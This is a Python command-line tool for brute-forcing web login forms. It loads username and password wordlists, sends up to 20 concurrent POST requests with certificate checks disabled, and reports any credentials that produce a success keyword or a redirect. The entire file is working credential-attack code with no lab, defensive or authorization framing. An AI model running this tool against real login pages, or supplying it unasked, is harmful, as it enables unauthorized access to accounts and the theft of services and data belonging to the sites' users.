import requests
import argparse
import urllib3
import concurrent.futures
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def test_credentials(url, username, password, field_user, field_pass, success_keyword):
    headers = {"User-Agent": "Mozilla/5.0"}
    try:
        # Check if it's a standard POST form login
        data = {field_user: username, field_pass: password}
        resp = requests.post(url, data=data, timeout=5, verify=False, headers=headers, allow_redirects=True)
        
        # Check for success indicators (redirect, status code, or specific text)
        if success_keyword in resp.text or resp.status_code == 302:
            return (username, password, True)
    except Exception:
        pass
    return (username, password, False)

def run_brute_forcer(url, user_file, pass_file, field_user, field_pass, success_keyword):
    print("=" * 60)
    print(f"[*] AUTHENTICATION BRUTE-FORCER: {url}")
    print("=" * 60)
    
    # Load users
    try:
        with open(user_file, "r") as f:
            usernames = [line.strip() for line in f if line.strip()]
    except IOError:
        usernames = [user_file] # Treat as single username if file doesn't exist
        
    # Load passwords
    try:
        with open(pass_file, "r") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except IOError:
        print(f"[-] Error: Password wordlist '{pass_file}' not found.")
        return

    print(f"[*] Loaded {len(usernames)} username(s) and {len(passwords)} password(s). Total combinations: {len(usernames) * len(passwords)}")
    print("[*] Launching multi-threaded credential attack...")
    
    success_found = False
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        futures = []
        for user in usernames:
            for pwd in passwords:
                futures.append(executor.submit(test_credentials, url, user, pwd, field_user, field_pass, success_keyword))
                
        for future in concurrent.futures.as_completed(futures):
            user, pwd, success = future.result()
            if success:
                print(f"\n\033[92m[!] SUCCESS VALID CREDENTIALS FOUND -> Username: '{user}' | Password: '{pwd}'\033[0m\n")
                success_found = True
                break
            else:
                sys.stdout.write(f"\r[-] Tried: {user}:{pwd}          ")
                sys.stdout.flush()
                
    if not success_found:
        print("\n\n[-] Brute-force completed. No valid credentials matched.")
    print("=" * 60)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Multi-Threaded Authentication Brute-Forcer")
    parser.add_argument("url", help="Target login endpoint URL")
    parser.add_argument("-u", "--user", default="admin", help="Username or path to username wordlist (default: 'admin')")
    parser.add_argument("-pw", "--passwords", required=True, help="Path to password wordlist file")
    parser.add_argument("--field-user", default="uname", help="HTML form username input field name")
    parser.add_argument("--field-pass", default="pass", help="HTML form password input field name")
    parser.add_argument("--success", default="Logout", help="Keyword in response indicating successful login")
    
    args = parser.parse_args()
    run_brute_forcer(args.url, args.user, args.passwords, args.field_user, args.field_pass, args.success)
